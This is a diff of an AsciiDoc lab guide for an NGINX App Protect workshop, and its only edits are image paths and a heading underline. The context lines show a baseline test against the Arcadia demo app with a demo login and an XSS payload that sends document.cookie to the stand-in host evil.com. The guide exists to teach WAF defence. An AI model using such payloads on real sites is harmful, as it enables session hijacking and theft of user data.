@@ -1,5 +1,4 @@
 == Access Arcadia App without NGINX App Protect to establish a baseline
-------------------------------------------------
 
 == Cleanup Process
 
@@ -106,7 +105,7 @@ Password: ilovef5
 When you click on Log me in, you should be presented with the Arcadia
 application that consists of four microservices:
 
-image:./pictures/image10.png[image]
+image:image10.png[image]
 
 Congratulations!
 
@@ -124,7 +123,7 @@ To perform the XSS attack, we can launch the Firefox browser and append
 `?a=<script>` to the end of the application URL. If the request is
 allowed, then our application is vulnerable to XSS attacks.
 
-image:./pictures/image11.png[image]
+image:image11.png[image]
 
 We can further test this by appending
 `?item='><script>document.location='http://evil.com/steal'+document.cookie</script>`
@@ -132,7 +131,7 @@ to the application URL, which will attempt to steal our document cookie.
 If this request is also allowed, then a bad actor could potentially
 steal sensitive information from our application user.
 
-image:./pictures/image12.png[image]
+image:image12.png[image]
 
 Since our application is currently vulnerable to Layer 7 attacks, we'll
 need to protect it using NGINX App Protect in the following Lab.
